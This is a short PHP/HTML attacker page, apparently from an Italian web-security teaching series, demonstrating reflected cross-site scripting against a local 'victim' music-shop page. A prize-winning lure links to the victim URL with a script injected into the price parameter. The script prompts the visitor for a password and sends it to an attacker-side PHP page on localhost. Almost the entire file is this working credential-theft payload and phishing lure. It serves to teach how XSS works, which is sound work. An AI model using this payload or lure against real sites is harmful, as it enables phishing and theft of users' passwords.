<?php
$script = "</h1><script>setTimeout(function (){let c=prompt('Inserisci la password');window.location.href='http://127.0.0.1/esempio21_7_XSS_Attack_POST_SitoAttaccante.php?c='.concat(c.replaceAll(' ','_'));}, 3000);
</script>";
?>
<!DOCTYPE html>
<html>
<head>
    <title>XSS Attack - Attacker page (GET)</title>
</head>
 <body bgcolor="#ffb3ff">
    <h3>Catalogo strumenti musicali: (sito attaccante)</h3>
    Complimenti! Hai vinto una chitarra!
    <br>
    Richiedila 
    <a href="http://127.0.0.1/esempio21_2_XSS_Attack_GET_SitoVittima.php?prodotto=Chitarra+elettrica&marca=Fender&prezzo=499<?= $script ?>">
        qui
    </a><br>
</body>
</html>


